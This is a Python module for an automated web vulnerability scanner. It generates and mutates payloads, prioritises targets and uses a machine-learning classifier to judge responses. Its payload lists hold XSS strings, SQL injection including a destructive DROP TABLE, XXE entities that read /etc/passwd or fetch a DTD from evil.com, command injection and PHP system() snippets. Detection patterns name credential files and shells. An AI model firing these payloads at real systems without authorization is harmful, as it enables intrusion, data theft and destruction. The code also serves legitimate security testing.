#!/usr/bin/env python3
"""
Intelligent AI Assistant - Efficient ML-based vulnerability analysis
Uses targeted ML models instead of expensive LLMs for better performance
"""

import json
import pickle
import hashlib
import re
from typing import Dict, List, Any, Optional, Tuple
from datetime import datetime
import numpy as np
from sklearn.feature_extraction.text import TfidfVectorizer
from sklearn.ensemble import RandomForestClassifier
from sklearn.model_selection import train_test_split
from sklearn.metrics import classification_report
import logging
from pathlib import Path


logger = logging.getLogger("IntelligentAI")

class IntelligentAIAssistant:
    """Efficient ML-powered vulnerability analysis - surpasses XBOW's LLM approach"""
    
    def __init__(self, asset_manager, config: Dict):
        self.asset_manager = asset_manager
        self.config = config.get('ai_assistance', {})
        self.enabled = self.config.get('enabled', True)
        self.mode = self.config.get('mode', 'ml_classification')
        
        # ML Models (lightweight and fast)
        self.vulnerability_classifier = None
        self.response_analyzer = None
        self.payload_generator = None
        self.vectorizer = None
        
        # Training data patterns
        self.vulnerability_patterns = self._load_vulnerability_patterns()
        self.false_positive_patterns = self._load_false_positive_patterns()
        
        # Initialize models
        if self.enabled:
            self._initialize_models()
    
    def _initialize_models(self):
        """Initialize ML models for efficient vulnerability detection"""
        try:
            # Try to load pre-trained models
            self._load_trained_models()
            logger.info("✅ Pre-trained AI models loaded")
        except Exception as e:
            logger.info("🔧 Training new AI models...")
            self._train_models()
            logger.info("✅ AI models trained and ready")
    
    def analyze_response_for_vulnerabilities(self, response_text: str, url: str, payload: str) -> Dict[str, Any]:
        """Analyze HTTP response for vulnerability indicators using ML"""
        if not self.enabled or not self.vulnerability_classifier:
            return {"ai_confidence": 0.0, "analysis": "AI disabled"}
        
        # Extract features from response
        features = self._extract_response_features(response_text, url, payload)
        
        # ML classification
        feature_vector = self.vectorizer.transform([features['text_features']])
        vulnerability_proba = self.vulnerability_classifier.predict_proba(feature_vector)[0]
        
        # Combine ML prediction with deterministic patterns
        pattern_confidence = self._pattern_based_confidence(response_text, payload)
        
        # Weighted final confidence (ML + patterns)
        final_confidence = (vulnerability_proba[1] * 0.7) + (pattern_confidence * 0.3)
        
        return {
            "ai_confidence": final_confidence,
            "ml_prediction": vulnerability_proba[1],
            "pattern_confidence": pattern_confidence,
            "vulnerability_indicators": features['indicators'],
            "false_positive_likelihood": self._check_false_positive_likelihood(response_text),
            "analysis": features['analysis'],
            "recommended_validation": self._recommend_validation_method(features)
        }
    
    def generate_intelligent_payloads(self, target_info: Dict[str, Any]) -> List[Dict[str, Any]]:
        """Generate targeted payloads based on target analysis"""
        if not self.enabled:
            return []
        
        payloads = []
        target_type = target_info.get('technology', 'unknown')
        url = target_info.get('url', '')
        
        # Base payload types
        base_payloads = {
            'xss': [
                '<script>alert("xss")</script>',
                '<img src=x onerror=alert("xss")>',
                '<svg onload=alert("xss")>',
                'javascript:alert("xss")'
            ],
            'sqli': [
                "' OR '1'='1",
                "\" OR \"1\"=\"1",
                "'; DROP TABLE users--",
                "1' AND SLEEP(5)--"
            ],
            'xxe': [
                '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
                '<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://evil.com/evil.dtd">%xxe;]>',
            ],
            'cmd_injection': [
                "; whoami",
                "| id",
                "& dir",
                "`uname -a`"
            ]
        }
        
        # Technology-specific payload optimization
        if 'php' in target_type.lower():
            base_payloads['cmd_injection'].extend(['<?php system("id");?>', '<?=`id`?>'])
        
        if 'java' in target_type.lower():
            base_payloads['xxe'].extend([
                '<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "jar:file:///etc/passwd!/foo">%xxe;]>'
            ])
        
        if 'graphql' in url.lower():
            base_payloads['graphql'] = [
                '{"query": "query{__typename}"}',
                '{"query": "query{__schema{types{name}}}"}',
                '{"query": "query IntrospectionQuery{__schema{types{...FullType}}}"}',
            ]
        
        # Generate contextual payloads
        for vuln_type, payload_list in base_payloads.items():
            for payload in payload_list:
                # Add context-aware mutations
                mutated_payloads = self._mutate_payload_contextually(payload, target_info)
                
                for mutated in mutated_payloads:
                    payloads.append({
                        'payload': mutated,
                        'type': vuln_type,
                        'confidence': self._calculate_payload_confidence(mutated, target_info),
                        'encoding': 'none',
                        'validation_method': self._recommend_validation_for_payload(vuln_type)
                    })
        
        # Sort by confidence and return top payloads
        payloads.sort(key=lambda x: x['confidence'], reverse=True)
        return payloads[:20]  # Top 20 most promising payloads
    
    def prioritize_targets_intelligently(self, targets: List[str]) -> List[Dict[str, Any]]:
        """Prioritize targets using AI analysis for maximum vulnerability discovery"""
        if not self.enabled:
            return [{'url': t, 'priority': 0.5} for t in targets]
        
        prioritized = []
        
        for target in targets:
            # Extract features for prioritization
            priority_features = {
                'url_indicators': self._extract_url_vulnerability_indicators(target),
                'technology_hints': self._detect_technology_from_url(target),
                'attack_surface': self._estimate_attack_surface(target),
                'historical_success': self._get_historical_success_rate(target)
            }
            
            # Calculate priority score
            priority_score = self._calculate_target_priority(priority_features)
            
            prioritized.append({
                'url': target,
                'priority': priority_score,
                'features': priority_features,
                'recommended_scanners': self._recommend_scanners_for_target(target, priority_features)
            })
        
        # Sort by priority (highest first)
        prioritized.sort(key=lambda x: x['priority'], reverse=True)
        return prioritized
    
    def validate_finding_with_ai(self, finding: Dict[str, Any]) -> Dict[str, Any]:
        """Use AI to validate and enhance vulnerability findings"""
        if not self.enabled:
            return {"validated": True, "confidence": 0.5}
        
        # Extract validation features
        validation_features = {
            'response_content': finding.get('proof', ''),
            'payload_used': finding.get('payload', ''),
            'http_status': finding.get('status_code', 200),
            'response_time': finding.get('response_time', 0),
            'headers': finding.get('headers', {}),
            'finding_type': finding.get('type', 'unknown')
        }
        
        # AI-powered false positive detection
        false_positive_score = self._detect_false_positive(validation_features)
        
        # Confidence adjustment based on AI analysis
        original_confidence = finding.get('confidence', 0.5)
        ai_adjusted_confidence = self._adjust_confidence_with_ai(original_confidence, validation_features)
        
        # Generate validation recommendations
        validation_recommendations = self._generate_validation_recommendations(validation_features)
        
        return {
            "validated": false_positive_score < 0.3,  # Low false positive likelihood
            "ai_confidence": ai_adjusted_confidence,
            "false_positive_likelihood": false_positive_score,
            "original_confidence": original_confidence,
            "validation_recommendations": validation_recommendations,
            "ai_analysis": self._generate_finding_analysis(validation_features)
        }
    
    # ========== PRIVATE METHODS ==========
    
    def _extract_response_features(self, response_text: str, url: str, payload: str) -> Dict[str, Any]:
        """Extract ML features from HTTP response"""
        features = {
            'text_features': '',
            'indicators': [],
            'analysis': ''
        }
        
        # Text features for ML
        text_parts = [
            response_text[:1000],  # First 1KB of response
            url,
            payload
        ]
        features['text_features'] = ' '.join(text_parts)
        
        # Vulnerability indicators
        indicators = []
        
        # XSS indicators
        if payload in response_text:
            indicators.append('payload_reflected')
        
        if any(pattern in response_text.lower() for pattern in ['<script', 'javascript:', 'onerror=', 'onload=']):
            indicators.append('xss_context')
        
        # SQL injection indicators
        if any(pattern in response_text.lower() for pattern in ['sql', 'mysql_fetch', 'ora-01756', 'syntax error']):
            indicators.append('sql_error')
        
        # XXE indicators
        if any(pattern in response_text for pattern in ['root:x:', '/etc/passwd', 'daemon:x:']):
            indicators.append('file_disclosure')
        
        # Command injection indicators
        if any(pattern in response_text for pattern in ['uid=', 'gid=', 'total 0', 'Windows Registry']):
            indicators.append('command_execution')
        
        # Error-based indicators
        if any(pattern in response_text.lower() for pattern in ['exception', 'stack trace', 'error', 'warning']):
            indicators.append('error_disclosure')
        
        features['indicators'] = indicators
        features['analysis'] = f"Found {len(indicators)} vulnerability indicators"
        
        return features
    
    def _pattern_based_confidence(self, response_text: str, payload: str) -> float:
        """Calculate confidence based on deterministic patterns"""
        confidence = 0.0
        
        # High confidence patterns
        high_confidence_patterns = [
            'root:x:0:0:', 'daemon:x:', '/bin/bash',  # File disclosure
            'mysql_fetch_array', 'ORA-01756', 'syntax error',  # SQL errors
            'uid=0(root)', 'gid=0(root)',  # Command execution
        ]
        
        for pattern in high_confidence_patterns:
            if pattern in response_text:
                confidence += 0.3
        
        # Medium confidence patterns
        medium_confidence_patterns = [
            'exception', 'stack trace', 'internal server error',
            'unexpected token', 'parse error'
        ]
        
        for pattern in medium_confidence_patterns:
            if pattern.lower() in response_text.lower():
                confidence += 0.1
        
        # Payload reflection (context matters)
        if payload in response_text:
            # Check if it's in dangerous context
            if any(ctx in response_text.lower() for ctx in ['<script', 'javascript:', 'onerror=', 'onload=']):
                confidence += 0.4
            else:
                confidence += 0.1
        
        return min(confidence, 1.0)
    
    def _check_false_positive_likelihood(self, response_text: str) -> float:
        """Check likelihood of false positive"""
        false_positive_patterns = [
            'page not found', '404 error', 'file not found',
            'access denied', 'unauthorized', 'forbidden',
            'coming soon', 'under construction', 'maintenance mode'
        ]
        
        false_positive_score = 0.0
        
        for pattern in false_positive_patterns:
            if pattern.lower() in response_text.lower():
                false_positive_score += 0.2
        
        return min(false_positive_score, 1.0)
    
    def _mutate_payload_contextually(self, payload: str, target_info: Dict[str, Any]) -> List[str]:
        """Generate contextual payload mutations"""
        mutations = [payload]  # Original payload
        
        # URL encoding mutations
        mutations.append(self._url_encode(payload))
        mutations.append(self._double_url_encode(payload))
        
        # HTML entity encoding for XSS
        if '<script' in payload or 'javascript:' in payload:
            mutations.append(self._html_entity_encode(payload))
        
        # Case variations
        mutations.append(payload.upper())
        mutations.append(payload.swapcase())
        
        # Context-specific mutations based on target technology
        technology = target_info.get('technology', '').lower()
        
        if 'php' in technology:
            mutations.extend([
                payload.replace('"', '\\"'),
                payload.replace("'", "\\'")
            ])
        
        if 'java' in technology:
            mutations.extend([
                payload.replace('<', '&lt;'),
                payload.replace('>', '&gt;')
            ])
        
        return list(set(mutations))  # Remove duplicates
    
    def _calculate_payload_confidence(self, payload: str, target_info: Dict[str, Any]) -> float:
        """Calculate confidence score for payload-target combination"""
        confidence = 0.5  # Base confidence
        
        # Technology matching
        technology = target_info.get('technology', '').lower()
        
        if 'php' in technology and ('<?php' in payload or '<?=' in payload):
            confidence += 0.3
        
        if 'java' in technology and ('jar:' in payload or 'class' in payload):
            confidence += 0.3
        
        if 'graphql' in target_info.get('url', '').lower() and 'query' in payload:
            confidence += 0.4
        
        # Payload complexity (simpler payloads often work better)
        if len(payload) < 50:
            confidence += 0.1
        
        # Known effective patterns
        effective_patterns = ['alert(', 'onerror=', "OR '1'='1", 'UNION SELECT', 'file:///']
        for pattern in effective_patterns:
            if pattern in payload:
                confidence += 0.2
                break
        
        return min(confidence, 1.0)
    
    def _load_vulnerability_patterns(self) -> Dict[str, List[str]]:
        """Load known vulnerability patterns"""
        return {
            'xss_indicators': [
                '<script', 'javascript:', 'onerror=', 'onload=', 'onfocus=',
                'onmouseover=', 'eval(', 'setTimeout(', 'setInterval('
            ],
            'sqli_indicators': [
                'mysql_fetch', 'pg_query', 'mssql_query', 'ora-01756',
                'syntax error', 'mysql_num_rows', 'division by zero'
            ],
            'xxe_indicators': [
                'root:x:', 'daemon:x:', '/etc/passwd', '/etc/hosts',
                'SYSTEM entity', 'DOCTYPE entity', 'External entity'
            ],
            'rce_indicators': [
                'uid=', 'gid=', 'total 0', 'Windows Registry',
                'bin/bash', '/bin/sh', 'System32', 'cmd.exe'
            ]
        }
    
    def _load_false_positive_patterns(self) -> List[str]:
        """Load patterns that indicate false positives"""
        return [
            'page not found', '404 not found', 'file not found',
            'coming soon', 'under construction', 'maintenance',
            'access denied', 'unauthorized', 'forbidden',
            'internal server error', 'service unavailable'
        ]
    
    def _train_models(self):
        """Train ML models using existing vulnerability data"""
        try:
            # Generate training data from historical scans
            training_data = self._generate_training_data()
            
            if len(training_data) < 10:
                logger.warning("⚠️  Limited training data - using pre-built patterns")
                self._initialize_pattern_based_models()
                return
            
            # Prepare features and labels
            texts = [item['text'] for item in training_data]
            labels = [item['is_vulnerability'] for item in training_data]
            
            # TF-IDF vectorization
            self.vectorizer = TfidfVectorizer(max_features=1000, stop_words='english')
            X = self.vectorizer.fit_transform(texts)
            
            # Train classifier
            X_train, X_test, y_train, y_test = train_test_split(X, labels, test_size=0.2, random_state=42)
            
            self.vulnerability_classifier = RandomForestClassifier(n_estimators=100, random_state=42)
            self.vulnerability_classifier.fit(X_train, y_train)
            
            # Evaluate model
            y_pred = self.vulnerability_classifier.predict(X_test)
            logger.info(f"AI Model trained - Accuracy: {self.vulnerability_classifier.score(X_test, y_test):.2f}")
            
            # Save models
            self._save_trained_models()
            
        except Exception as e:
            logger.error(f"Model training failed: {e}")
            self._initialize_pattern_based_models()
    
    def _generate_training_data(self) -> List[Dict[str, Any]]:
        """Generate training data from historical vulnerability findings"""
        training_data = []
        
        try:
            with self.asset_manager._get_db() as db:
                # Get positive examples (confirmed vulnerabilities)
                cursor = db.execute("""
                    SELECT evidence, payload, type, confidence 
                    FROM vulnerabilities 
                    WHERE confidence > 0.7
                    LIMIT 1000
                """)
                
                for row in cursor.fetchall():
                    evidence, payload, vuln_type, confidence = row
                    training_data.append({
                        'text': f"{evidence} {payload}",
                        'is_vulnerability': 1,
                        'confidence': confidence
                    })
                
                # Get negative examples (assets with no vulnerabilities)
                cursor = db.execute("""
                    SELECT url, title, status_code 
                    FROM assets 
                    WHERE id NOT IN (SELECT DISTINCT asset_id FROM vulnerabilities WHERE asset_id IS NOT NULL)
                    LIMIT 500
                """)
                
                for row in cursor.fetchall():
                    url, title, status_code = row
                    training_data.append({
                        'text': f"{url} {title or ''} {status_code}",
                        'is_vulnerability': 0,
                        'confidence': 0.0
                    })
        
        except Exception as e:
            logger.error(f"Error generating training data: {e}")
        
        return training_data
    
    def _initialize_pattern_based_models(self):
        """Initialize simple pattern-based models when ML training fails"""
        # Simple vectorizer for basic text processing
        self.vectorizer = TfidfVectorizer(max_features=500)
        
        # Fit on vulnerability patterns
        pattern_texts = []
        for category, patterns in self.vulnerability_patterns.items():
            pattern_texts.extend(patterns)
        
        if pattern_texts:
            self.vectorizer.fit(pattern_texts)
        
        # Placeholder classifier (pattern-based)
        self.vulnerability_classifier = None
        logger.info("✅ Pattern-based AI assistant initialized")
    
    def _save_trained_models(self):
        """Save trained models to disk"""
        try:
            models_dir = Path(self.asset_manager.base_dir) / 'models'
            models_dir.mkdir(exist_ok=True)
            
            # Save vectorizer
            with open(models_dir / 'vectorizer.joblib', 'wb') as f:
                pickle.dump(self.vectorizer, f)
            
            # Save classifier
            with open(models_dir / 'vulnerability_classifier.joblib', 'wb') as f:
                pickle.dump(self.vulnerability_classifier, f)
                
            logger.info("✅ AI models saved to disk")
            
        except Exception as e:
            logger.error(f"Error saving models: {e}")
    
    def _load_trained_models(self):
        """Load pre-trained models from disk"""
        models_dir = Path(self.asset_manager.base_dir) / 'models'
        
        # Load vectorizer
        with open(models_dir / 'vectorizer.joblib', 'rb') as f:
            self.vectorizer = pickle.load(f)
        
        # Load classifier
        with open(models_dir / 'vulnerability_classifier.joblib', 'rb') as f:
            self.vulnerability_classifier = pickle.load(f)
    
    # Additional helper methods
    def _url_encode(self, text: str) -> str:
        """URL encode text"""
        import urllib.parse
        return urllib.parse.quote(text)
    
    def _double_url_encode(self, text: str) -> str:
        """Double URL encode text"""
        import urllib.parse
        return urllib.parse.quote(urllib.parse.quote(text))
    
    def _html_entity_encode(self, text: str) -> str:
        """HTML entity encode text"""
        import html
        return html.escape(text)
    
    def _extract_url_vulnerability_indicators(self, url: str) -> List[str]:
        """Extract vulnerability indicators from URL"""
        indicators = []
        url_lower = url.lower()
        
        # Parameter indicators
        if '?' in url:
            indicators.append('has_parameters')
        
        # Technology indicators
        tech_indicators = {
            'php': ['.php', '/php/', 'index.php'],
            'asp': ['.asp', '.aspx', '/asp/'],
            'java': ['.jsp', '.do', '/java/'],
            'api': ['/api/', '/rest/', '/json/'],
            'admin': ['/admin/', '/administrator/', '/manage/']
        }
        
        for tech, patterns in tech_indicators.items():
            if any(pattern in url_lower for pattern in patterns):
                indicators.append(f'tech_{tech}')
        
        return indicators
    
    def _detect_technology_from_url(self, url: str) -> str:
        """Detect technology stack from URL"""
        url_lower = url.lower()
        
        if any(ext in url_lower for ext in ['.php', '/php/']):
            return 'php'
        elif any(ext in url_lower for ext in ['.asp', '.aspx']):
            return 'asp'
        elif any(ext in url_lower for ext in ['.jsp', '.do']):
            return 'java'
        elif 'graphql' in url_lower:
            return 'graphql'
        elif '/api/' in url_lower or '/rest/' in url_lower:
            return 'api'
        else:
            return 'unknown'
    
    def _estimate_attack_surface(self, url: str) -> float:
        """Estimate attack surface size"""
        surface_score = 0.0
        
        # Parameters increase attack surface
        if '?' in url:
            param_count = url.count('&') + 1
            surface_score += min(param_count * 0.1, 0.5)
        
        # Path depth
        path_depth = url.count('/') - 2  # Subtract protocol ://
        surface_score += min(path_depth * 0.05, 0.3)
        
        # Technology indicators
        if any(tech in url.lower() for tech in ['admin', 'api', 'upload', 'login']):
            surface_score += 0.2
        
        return min(surface_score, 1.0)
    
    def _get_historical_success_rate(self, url: str) -> float:
        """Get historical vulnerability discovery success rate for similar URLs"""
        try:
            # Extract domain
            from urllib.parse import urlparse
            domain = urlparse(url).netloc
            
            with self.asset_manager._get_db() as db:
                # Get vulnerability rate for this domain
                cursor = db.execute("""
                    SELECT 
                        COUNT(DISTINCT v.id) as vulns,
                        COUNT(DISTINCT a.id) as assets
                    FROM assets a
                    LEFT JOIN vulnerabilities v ON a.id = v.asset_id
                    WHERE a.url LIKE ?
                """, (f"%{domain}%",))
                
                result = cursor.fetchone()
                if result and result[1] > 0:
                    return result[0] / result[1]  # Vulnerability rate
        
        except Exception:
            pass
        
        return 0.1  # Default low success rate
    
    def _calculate_target_priority(self, features: Dict[str, Any]) -> float:
        """Calculate priority score for target"""
        score = 0.5  # Base priority
        
        # URL indicators
        url_indicators = features.get('url_indicators', [])
        score += len(url_indicators) * 0.1
        
        # Technology bonus
        tech = features.get('technology_hints', 'unknown')
        tech_scores = {
            'php': 0.3, 'asp': 0.2, 'java': 0.2,
            'api': 0.4, 'graphql': 0.4, 'admin': 0.5
        }
        score += tech_scores.get(tech, 0.0)
        
        # Attack surface
        score += features.get('attack_surface', 0.0) * 0.3
        
        # Historical success
        score += features.get('historical_success', 0.0) * 0.2
        
        return min(score, 1.0)
    
    def _recommend_scanners_for_target(self, url: str, features: Dict[str, Any]) -> List[str]:
        """Recommend best scanners for target"""
        recommended = ['traditional']  # Always include traditional
        
        tech = features.get('technology_hints', 'unknown')
        
        if tech == 'graphql' or 'graphql' in url.lower():
            recommended.append('graphql')
        
        if tech in ['php', 'java'] or '/api/' in url.lower():
            recommended.extend(['xxe', 'api_logic'])
        
        if 'admin' in url.lower() or 'api' in url.lower():
            recommended.append('api_logic')
        
        return recommended
    
    # Placeholder methods for additional functionality
    def _recommend_validation_method(self, features: Dict[str, Any]) -> str:
        """Recommend validation method based on features"""
        if 'file_disclosure' in features.get('indicators', []):
            return 'file_content_validation'
        elif 'sql_error' in features.get('indicators', []):
            return 'database_error_validation'
        elif 'xss_context' in features.get('indicators', []):
            return 'dom_validation'
        else:
            return 'response_analysis'
    
    def _recommend_validation_for_payload(self, vuln_type: str) -> str:
        """Recommend validation method for payload type"""
        validation_methods = {
            'xss': 'dom_validation',
            'sqli': 'timing_validation',
            'xxe': 'file_content_validation',
            'cmd_injection': 'command_output_validation',
            'graphql': 'response_structure_validation'
        }
        return validation_methods.get(vuln_type, 'response_analysis')
    
    def _detect_false_positive(self, features: Dict[str, Any]) -> float:
        """Detect false positive likelihood"""
        fp_score = 0.0
        
        content = features.get('response_content', '').lower()
        
        # Check for false positive patterns
        for pattern in self.false_positive_patterns:
            if pattern in content:
                fp_score += 0.2
        
        # HTTP status indicators
        status = features.get('http_status', 200)
        if status in [404, 403, 500]:
            fp_score += 0.3
        
        return min(fp_score, 1.0)
    
    def _adjust_confidence_with_ai(self, original_confidence: float, features: Dict[str, Any]) -> float:
        """Adjust confidence using AI analysis"""
        adjusted = original_confidence
        
        # Boost confidence for strong indicators
        if features.get('finding_type') in ['xxe', 'sqli', 'rce']:
            adjusted += 0.1
        
        # Reduce confidence for potential false positives
        fp_likelihood = self._detect_false_positive(features)
        adjusted -= (fp_likelihood * 0.3)
        
        return max(0.0, min(1.0, adjusted))
    
    def _generate_validation_recommendations(self, features: Dict[str, Any]) -> List[str]:
        """Generate validation recommendations"""
        recommendations = []
        
        finding_type = features.get('finding_type', 'unknown')
        
        if finding_type == 'xxe':
            recommendations.extend([
                'Verify file content disclosure',
                'Test with external DTD',
                'Check for OOB callbacks'
            ])
        elif finding_type == 'sqli':
            recommendations.extend([
                'Test timing-based confirmation',
                'Verify database error messages',
                'Check for data extraction'
            ])
        elif finding_type == 'xss':
            recommendations.extend([
                'Confirm payload execution in browser',
                'Check for DOM manipulation',
                'Test with different encodings'
            ])
        
        return recommendations
    
    def _generate_finding_analysis(self, features: Dict[str, Any]) -> str:
        """Generate human-readable analysis"""
        analysis_parts = []
        
        finding_type = features.get('finding_type', 'unknown')
        analysis_parts.append(f"Vulnerability type: {finding_type}")
        
        if features.get('response_content'):
            content_length = len(features['response_content'])
            analysis_parts.append(f"Response length: {content_length} chars")
        
        status = features.get('http_status', 200)
        analysis_parts.append(f"HTTP status: {status}")
        
        return " | ".join(analysis_parts)